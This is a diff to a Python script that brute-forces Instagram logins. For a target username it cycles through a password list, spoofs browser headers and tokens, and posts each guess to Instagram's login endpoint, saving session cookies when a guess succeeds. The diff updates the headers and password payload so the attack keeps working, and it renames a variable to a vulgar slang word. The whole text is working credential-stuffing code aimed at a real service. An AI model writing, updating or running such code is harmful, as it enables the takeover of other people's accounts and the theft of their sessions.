@@ -726,42 +726,50 @@ def UserAgentBarcelona():
     ua2 = f'instagram {ig_version} ({iphone}; iOS 17_5_1; {locale}; ru; scale=3.00; {pxl}; {kode}; IABMV/1)'
     return(random.choice([ua1, ua2]))
 
-def Crack_api(username, memek):
+def Crack_api(username, kontol):
     global Ok, Cp, Loop
     sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} web {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
-    for password in memek:
+    for password in kontol:
         try:
             ses = requests.Session()
             cok = ses.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
-                          headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104'}, timeout=10).cookies.get_dict()
+            headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104'}, timeout=10).cookies.get_dict()
             cooki = ("; ").join([f"{key}={value}" for key, value in cok.items()])
             csrf = list(ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/', timeout=10).cookies.items())[0][1]
+            time_now = int(datetime.now().timestamp())
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}"
             headers = {
-                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23F81 instagram 317.0.4.27.109 (iPhone18,1; iOS 26_5_1; en_US; en; scale=3.00; 960x2079; 562830928) NW/3',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-                'x-ig-www-claim': 'hmac.AR0y3gXr0HnsEAH0EGqFP7FOuPYc7F3xsPm3GzTw2fqbjS4e',
-                'sec-ch-ua-platform-version': '"11.0.0"',
-                'x-requested-with': 'XMLHttpRequest',
-                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'x-csrftoken': f'{csrf}',
-                'sec-ch-ua-platform': '"Android"',
-                'x-ig-app-id': '1217981644879628',
-                'sec-ch-ua-model': '"Redmi Note 8"',
-                'sec-ch-ua-mobile': '?1',
-                'x-instagram-ajax': '1014410995',
-                'x-asbd-id': '129477',
-                'origin': 'https://www.instagram.com',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-dest': 'empty',
-                'referer': 'https://www.instagram.com/',
-                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Cookie': cooki
-            }
-            data = f'enc_password=%23PWD_instagram_BROWSER%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}&optIntoOneTap=false&queryParams=%7B%22next%22%3A%22%2F%22%2C%22source%22%3A%22mobile_nav%22%7D&trustedDeviceRecords=%7B%7D&username={urllib.request.quote(str(username))}'
+            'sec-ch-ua-full-version-list': '"Not;A=Brand";v="99.0.0.0", "Google Chrome";v="139.0.7258.139", "Chromium";v="139.0.7258.139"',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-mobile': '?0',
+            'X-IG-App-ID': '936619743392459',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Accept': '*/*',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Instagram-AJAX': '1045451524',
+            'X-CSRFToken': f'{csrf}',
+            'X-Web-Session-ID': 'ec866l:cmiism:xtyyqc',
+            'Referer': 'https://www.instagram.com/its_ariyan_45/',
+            'X-IG-Max-Touch-Points': '0',
+            'X-ASBD-ID': '359341',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
+            'X-IG-WWW-Claim': 'hmac.AR1MRjq4NDRS5ZIXXBy5Lnd_dIPooHuvrTAVNe43OFHdhifp',
+            'sec-ch-ua-platform-version': '"10.0.0"',}
+            data = {
+            'enc_password': f'{enc_password}',
+            'caaF2DebugGroup': '-1',
+            'isPrivacyPortalReq': 'false',
+            'loginAttemptSubmissionCount': '1',
+            'optIntoOneTap': 'true',
+            'queryParams': '{}',
+            'trustedDeviceRecords': '{}',
+            'username': f'{username}',
+            'jazoest': '22635',
+            'fb_dtsg': 'NAfwzLGc2sjk1hMgENO8Pm3F6-rYS92A-LcWXS19a3Gzapa1Is7ulMg:17843708194158284:1787074430',}
             response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=30)
             if 'userId' in str(response.text):
                 kuki = ";".join([str(x) + "=" + str(y) for x, y in ses.cookies.get_dict().items()])
@@ -786,6 +794,7 @@ def Crack_api(username, memek):
         except requests.exceptions.ConnectionError:
             time.sleep(20)
         except Exception as e:
+            print(e)
             continue
     Loop += 1
 
